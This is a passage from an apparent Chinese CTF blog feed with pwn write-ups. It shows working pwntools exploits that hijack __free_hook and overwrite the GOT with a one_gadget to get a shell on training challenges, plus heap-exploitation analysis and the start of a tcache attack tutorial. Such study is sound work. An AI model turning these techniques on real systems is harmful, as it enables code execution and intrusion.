class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># 偏移测试libc版本</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># 偏移测试libc版本</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28306</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;write the note: &#x27;</span>)</span><br><span class="line">    r.sendline(content.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter idx(0~15): &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x50000</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libcbase = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x51000</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x50000</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-message-board"><a href="#0x04-message-board" class="headerlink" title="0x04 message_board"></a>0x04 message_board</h3><h5 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h5><p>附件给出了libc2.31的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  board();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can modify your suggestions&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input new suggestion&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    a[v4] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>board函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (**board())(<span class="type">const</span> <span class="type">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> (**result)(<span class="type">const</span> <span class="type">char</span> *); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-9Ch] BYREF</span></span><br><span class="line">  __int64 v2[<span class="number">18</span>]; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+9Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you have any suggestions for us&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2[i + <span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your suggestion is %ld\n&quot;</span>, v2[i + <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please enter the verification code&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v2);</span><br><span class="line">  result = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span> (**)(<span class="type">const</span> <span class="type">char</span> *))v2[<span class="number">0</span>] != &amp;<span class="built_in">puts</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>主函数没有return，board函数的return也没法利用，所以肯定不是ROP。看到主函数里有一个自定义数组索引的输入，很容易想到数组越界。一看a数组刚好在bss段，所以可以利用数组越界修改exit的got表为one_gadget来getshell，偏移为-28。这里需要注意一个问题是，a数组储存的数据类型是dd（DWORD），也就是四个字节，所以写libc地址的时候需要分两次写到-28和-27偏移。不用system的原因是一个是没必要，第二也没地方写binsh。</p><p>在数组越界之前，在board函数里需要绕过一个“认证”，它要求我们输入puts的libc地址，这也就要求我们泄露libc地址。这里有个知识点，scanf无返回特性，利用这个特性我们可以结合printf打印出留存在栈上的libc地址，从而通过检查，进行数组越界。下面我们讲讲这个特性。</p><h5 id="scanf无返回特性"><a href="#scanf无返回特性" class="headerlink" title="scanf无返回特性"></a>scanf无返回特性</h5><p>这个特性比较有意思。众所周知，scanf只会接收格式化字符串指定的数据，那不符合的那些输入怎么办？答案是拒之门外或者扔掉。举个例子，如果他原本要接收%d的数据，结果你输入了123abc，那它会只接收123，而abc还存在stdin中；如果输入了超出了int范围的数字就会高位截断，也就是我们常说的整数溢出；如果直接输入字母，那么他不接收任何东西，如果原本变量上已经初始化了一个值，那么这个值依然不会变，但是如果接下来有多个scanf，程序会直接全部跳过；如果输入的是单独一个‘+’或‘-’，因为这两个字符对于int来说是合法的，但是又不存在数字，所以scanf选择接收，但是不会改变变量的值。综上所述，我们只要在scanf输入加号减号就可以跳过一次输入，并且不影响下面的输入。关于scanf其他特性，可以去看C0Lin师傅的总结：<a href="https://blog.csdn.net/qq_54218833/article/details/121308367">以PWN视角看待C函数——scanf</a>。</p><p>我们看回到这道题，我们要尝试打印libc地址，栈上一般都会有libc地址留存，但是如果我们输入东西肯定会覆盖掉原本的内容，所以就需要用加减号绕过。我们先来看看原本board函数栈上的布局：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/message_board%E6%A0%88%E5%B8%83%E5%B1%80.png" alt="message_board栈布局"></p><p>v2数组从rbp-0x98（0008处）开始，所以v2[2]就是一个libc地址，所以我们只要绕过2条建议的scanf就可以拿到libc地址了。</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27152</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;./message_board&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode())))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">libc_stderr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode())</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_stderr))</span><br><span class="line">libcbase = libc_stderr-libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">libc_puts = libcbase+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>((libc_puts)))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;code\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc_puts).encode())</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">libc_one = p64(one[<span class="number">1</span>]+libcbase)</span><br><span class="line">one_l = u32(libc_one[:<span class="number">4</span>])</span><br><span class="line">one_h = u32(libc_one[<span class="number">4</span>:])</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;You can modify your suggestions&quot;</span>, <span class="built_in">str</span>(-<span class="number">28</span>).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input new suggestion&quot;</span>, <span class="built_in">str</span>(one_l).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;You can modify your suggestions&quot;</span>, <span class="built_in">str</span>(-<span class="number">27</span>).encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;input new suggestion&quot;</span>, <span class="built_in">str</span>(one_h).encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-god-of-change"><a href="#0x05-god-of-change" class="headerlink" title="0x05 god_of_change"></a>0x05 god_of_change</h3><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>菜单堆题，有add，delete和show三个功能，其中add中写content的时候存在off by one的漏洞，自然而然想到劫持size字段造成overlapping。接触了这么多堆题，不难发现，提前规划堆布局很重要，所以先来考虑getshell的方式。最简单直接的getshell方式就是劫持__free_hook执行system函数，前提是知道libc基址。这道题开了PIE，所以很难通过got表来打印出libc地址，但是slot的数量上限是32个，每个slot大小最大是0x7F，所以可以考虑通过unsortedbin来泄露libc地址。所以这道题最重要的布局其实是对于泄露libc地址进行的。</p><h5 id="利用Unsortedbin泄露libc地址"><a href="#利用Unsortedbin泄露libc地址" class="headerlink" title="利用Unsortedbin泄露libc地址"></a>利用Unsortedbin泄露libc地址</h5><p>Unsortedbin由一个循环链表来维护，如下图所示：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/unsortedbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="unsortedbin循环链表（from xswlhhh）"></p><p>而main_arena其实是一个libc地址，他在libc中与__malloc_hook函数有着固定的偏移，一般是0x10，如果有libc附件，我们就可以轻松得到libc基址。问题在于我们如何获取main_arena的地址。显然链表头（最后一个chunk）的fd和链表尾的bk（第一个chunk）都指向main_arena，如果我们能够free掉这两个chunk其中之一后依然能够打印chunk内容，我们就获得了libc地址。</p><h5 id="动调分析"><a href="#动调分析" class="headerlink" title="动调分析"></a>动调分析</h5><p>首先要先想办法把一个chunk放进unsortedbin中。程序中限制了申请的size不超过127，所以只能通过off by one来修改size。想要放进unsortedbin中至少要超过0x400的大小绕过tcachebin并且不能和top chunk相邻。由于每次只能改一个字节，所以需要通过chunk0修改chunk1，通过chunk1覆盖chunk2的头去改掉chunk2的size。这时候释放掉chunk2就能进unsortedbin。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%BF%9B%E5%85%A5unsortedbin.png" alt="god_of_change进入unsortedbin"></p><p>如上图会发现我还申请了很多0x80大小的chunk，是因为我需要防止修改完size的chunk2和topchunk相邻。如果相邻，那么free之后会直接被topchunk合并。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%A2%ABtopchunk%E5%90%88%E5%B9%B6.png" alt="god_of_change被topchunk合并"></p><p>接下来申请一个0x40大小的chunk，它会从chunk2中被切割下来，剩下那部分依然存在unsortedbin中。此时unsortedbin中只有一个chunk，所以他的fd和bk都是main_arena的地址。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E6%89%93%E5%8D%B0libc%E6%97%B6%E7%9A%84%E5%A0%86%E5%B8%83%E5%B1%80.png" alt="god_of_change打印libc时的堆布局"></p><p>可以看到这个地址和main_arena的偏移是0x60，所以libc的基址是泄露的地址-0x70-__malloc_hook的偏移。</p><p>接下来要劫持__free_hook为system的地址，并且要提前写入&#x2F;bin&#x2F;sh。思路是修改一个chunk的fd为hook的地址，然后申请一个相同大小的chunk就能申请到hook，然后修改其为system地址，然后立刻释放掉写有&#x2F;bin&#x2F;sh的chunk就getshell了。</p><p>我们先申请多一个0x40（总之是chunk2要一样的大小）大小的chunk，然后释放掉（chunk3）放入tcachebin中，后面用来申请到hook位置。然后释放掉之前申请的chunk2和chunk1。此时chunk1的一部分和chunk2是重叠的，所以申请chunk1大小的chunk就可以修改chunk2的fd，顺便在user_data开始处写sh，别忘了不要覆盖了chunk2的size字段。然后申请两个chunk2大小的chunk，第二个chunk就在hook地址，修改掉其指针为system。然后释放掉chunk1就getshell了。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E6%9C%80%E5%90%8E%E5%A0%86%E5%B8%83%E5%B1%80.png" alt="god_of_change最后堆布局"></p><p>通过debug找到hook的地址确认劫持成功：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/god_of_change%E8%A2%AB%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84hook.png" alt="god_of_change被修改后的hook"></p><p>但是毕竟是patch过libc的可能libc的加载地址还是不太一样（上面libc地址一片空白我就觉得很奇怪了），在本地打不通，所以直接在线环境去尝试一下，是能通的。</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./god_of_change&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node5.buuoj.cn&#x27;, 25861)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;deadbeef&#x27;</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0x61</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(<span class="number">0x441</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;content: \n&#x27;</span>)</span><br><span class="line"><span class="comment"># print(r.recvuntil(b&#x27;\x7f&#x27;))</span></span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - \</span><br><span class="line">    <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x58</span>, flat(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x41</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">新生赛复现，主要是为了复现堆题。</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>『Heap Exploitation』tcache_attack</title>
    <link href="https://c-lby.top/2024/02/17/tcache-attack/"/>
    <id>https://c-lby.top/2024/02/17/tcache-attack/</id>
    <published>2024-02-17T03:52:16.000Z</published>
    <updated>2024-03-04T04:33:43.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TcacheBin-Attack"><a href="#TcacheBin-Attack" class="headerlink" title="TcacheBin Attack"></a>TcacheBin Attack</h2><p>根据源代码我们可以得知，高版本的glibc给tcachebin引入了检查机制，使得攻击没那么方便了，但正所谓道高一尺魔高一丈，没有攻不破的系统，只有不努力的黑客。tcache的检查机制主要有两个：对double free的检查和对chunk对齐的检查。前者的分析见<a href="https://c-lby.github.io/2024/02/14/glibc_tcachebin/#TcacheBin%E5%AD%98%E5%8F%96chunk">TcacheBin存取chunk</a>。这里对chunk对齐的机制进行溯源。</p><h3 id="chunk对齐检查机制"><a href="#chunk对齐检查机制" class="headerlink" title="chunk对齐检查机制"></a>chunk对齐检查机制</h3><p>tcache通过aligned_OK(e)函数来检查chunk对齐。在malloc.c第1322行有宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br></pre></td></tr></table></figure><p>然后在sysdeps&#x2F;generic&#x2F;malloc-size.h里可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><p>在malloc-alignment.h里有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MALLOC_ALIGNMENT is the minimum alignment for malloc&#x27;ed chunks.  It must be a power of two at least 2 * SIZE_SZ, even on machines for which smaller alignments would suffice. It may be defined as larger than this though. Note however that code and data structures are optimized for the case of 8-byte alignment.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line"><span class="meta">  ? __alignof__ (long double) : 2 * 